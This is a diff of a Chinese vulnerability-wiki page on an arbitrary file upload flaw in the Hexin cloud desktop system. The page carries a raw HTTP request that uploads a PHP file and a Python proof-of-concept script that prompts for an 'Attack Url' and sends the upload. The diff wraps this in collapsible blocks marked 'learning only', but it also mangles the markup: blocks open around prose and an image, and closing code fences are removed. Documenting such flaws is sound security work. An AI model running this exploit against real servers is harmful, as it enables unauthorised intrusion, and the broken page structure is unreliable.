@@ -21,8 +21,10 @@ tags:
 
 ```
 和信创天云桌面系统
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 ## 漏洞复现
 
 登录页面如下
@@ -51,9 +53,10 @@ Content-Length: 182
 Content-Disposition: form-data; name="file"; filename="test.php"
 Content-Type: image/avif
 
-<?php phpinfo(); ?>
-------WebKitFormBoundaryfcKRltGv--
-```
+&lt;?php phpinfo(); ?&gt;
+------WebKitFormBoundaryfcKRltGv--</code></pre>
+
+</details>
 
 
 
@@ -63,8 +66,10 @@ Content-Type: image/avif
 
 ```plain
 http://xxx.xx.xxx.xxx/Upload/1/test.php
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
+<pre><code class="language-text">
 
 
 ![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/webapp/images/202202101932224.png)
@@ -88,8 +93,8 @@ def title():
     print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
     print('+  \033[34mVersion: 和信云桌面任意文件上传漏洞                                       \033[0m')
     print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
-    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
-    print('+  \033[36mCmd         >>> whoami                                            \033[0m')
+    print('+  \033[36mUrl         &gt;&gt;&gt; http://xxx.xxx.xxx.xxx                             \033[0m')
+    print('+  \033[36mCmd         &gt;&gt;&gt; whoami                                            \033[0m')
     print('+------------------------------------------')
 
 def POC_1(target_url):
@@ -98,7 +103,7 @@ def POC_1(target_url):
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)",
             "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryfcKRltGv"
     }
-    data = base64.b64decode("Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==")
+    data = &#98;ase64.&#98;64decode("Q29udGVudC1UeXBlOiBtdWx0aXBhcnQvZm9ybS1kYXRhOyBib3VuZGFyeT0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YKCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWZjS1JsdEd2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZmlsZSI7IGZpbGVuYW1lPSJ0ZXN0LnBocCIKQ29udGVudC1UeXBlOiBpbWFnZS9hdmlmCgo8P3BocCBwaHBpbmZvKCk7Pz4KLS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5ZmNLUmx0R3YtLQ==")
     try:
         requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
         response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5)
@@ -118,9 +123,10 @@ def POC_1(target_url):
 
 if __name__ == '__main__':
     title()
-    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
-    POC_1(target_url)
-```
+    target_url = str(input("\033[35mPlease input Attack Url\nUrl &gt;&gt;&gt; \033[0m"))
+    POC_1(target_url)</code></pre>
+
+</details>
 
 
 
